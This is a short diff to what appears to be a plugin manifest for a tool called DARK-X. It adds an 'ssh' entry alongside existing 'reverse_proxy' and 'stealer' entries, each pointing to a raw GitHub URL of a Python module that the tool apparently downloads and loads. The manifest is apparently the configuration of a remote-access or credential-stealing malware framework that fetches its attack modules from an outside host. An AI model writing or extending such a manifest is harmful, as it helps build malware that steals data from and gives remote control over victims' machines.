@@ -19,6 +19,10 @@
 		"Url" : "https://raw.githubusercontent.com/UQABXO/DARK-X/main/Plugins/reverse_proxy.py",
 		"Extention" : "Py"
 	},
+	"ssh": {
+		"Url" : "https://raw.githubusercontent.com/UQABXO/DARK-X/main/Plugins/SSH.py",
+		"Extention" : "Py"
+	},
 	"stealer": {
 		"Url" : "https://raw.githubusercontent.com/UQABXO/DARK-X/main/Plugins/Stealer.py",
 		"Extention" : "Py"
